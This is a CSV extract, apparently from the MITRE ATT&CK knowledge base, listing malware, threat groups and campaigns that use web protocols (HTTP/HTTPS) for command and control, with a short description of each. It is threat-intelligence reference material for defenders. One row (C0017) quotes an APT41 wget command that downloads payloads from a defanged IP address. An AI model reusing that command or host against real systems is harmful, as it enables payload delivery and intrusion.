ID,Name,Description,Techniques,Tactics,Techniques-Description,Techniques-Name
G1043,BlackByte,BlackByte collected victim device information then transmitted this via HTTP POST to command and control infrastructure.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0089,BlackEnergy,BlackEnergy communicates with its C2 server over HTTP.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0564,BlackMould,BlackMould can send commands to C2 in the body of HTTP POST requests.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0520,BLINDINGCAN,BLINDINGCAN has used HTTPS over port 443 for command and control.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0657,BLUELIGHT,BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1184,BOLDMOVE,BOLDMOVE uses web services for command and control communication.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0635,BoomBox,BoomBox has used HTTP POST requests for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
G0060,BRONZE BUTLER,BRONZE BUTLER malware has used HTTP for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1063,Brute Ratel C4,Brute Ratel C4 can use HTTPS and HTTPS for C2 communication.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0043,BUBBLEWRAP,BUBBLEWRAP can communicate using HTTP or HTTPS.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0482,Bundlore,Bundlore uses HTTP requests for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
C0017,C0017,"During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads.",T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
C0018,C0018,"During C0018, the threat actors used HTTP for C2 communications.",T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
C0021,C0021,"During C0021, the threat actors used HTTP for some of their C2 communications.",T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0030,Carbanak,The Carbanak malware communicates to its command server using HTTP with an encrypted payload.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0484,Carberp,Carberp has connected to C2 servers via HTTP.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0335,Carbon,Carbon can use HTTP in C2 communications.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0348,Cardinal RAT,Cardinal RAT is downloaded using HTTP over port 443.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0631,Chaes,Chaes has used HTTP for C2 communications.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0674,CharmPower,CharmPower can use HTTP to communicate with C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0144,ChChes,ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
G0114,Chimera,Chimera has used HTTPS for C2 communications.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1149,CHIMNEYSWEEP,CHIMNEYSWEEP can send HTTP GET requests to  C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0020,China Chopper,China Chopper's server component executes code sent via HTTP POST commands.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0023,CHOPSTICK,Various implementations of CHOPSTICK communicate with C2 over HTTP.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0660,Clambling,Clambling has the ability to communicate over HTTP.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0054,CloudDuke,One variant of CloudDuke uses HTTP and HTTPS for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1105,COATHANGER,COATHANGER uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
G0080,Cobalt Group,Cobalt Group has used HTTPS for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0154,Cobalt Strike,Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0244,Comnie,Comnie uses HTTP for C2 communication.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0126,ComRAT,ComRAT has used HTTP requests for command and control.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
G0142,Confucius,Confucius has used HTTP for C2 communications.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0137,CORESHELL,CORESHELL can communicate over HTTP for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0050,CosmicDuke,CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1155,Covenant,Covenant can establish command and control via HTTP.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0046,CozyCar,CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1023,CreepyDrive,CreepyDrive can use HTTPS for C2 using the Microsoft Graph API.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1024,CreepySnail,CreepySnail can use HTTP for C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0115,Crimson,Crimson can use a HTTP GET request to download its final payload.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0538,Crutch,Crutch has conducted C2 communications with a Dropbox account using the HTTP API.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0527,CSPY Downloader,CSPY Downloader can use GET requests to download additional payloads from C2.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S1153,Cuckoo Stealer,Cuckoo Stealer can use the curl API for C2 communications.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
S0687,Cyclops Blink,Cyclops Blink can download files via HTTP and HTTPS.,T1071.001,Command and Control,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",Web Protocols
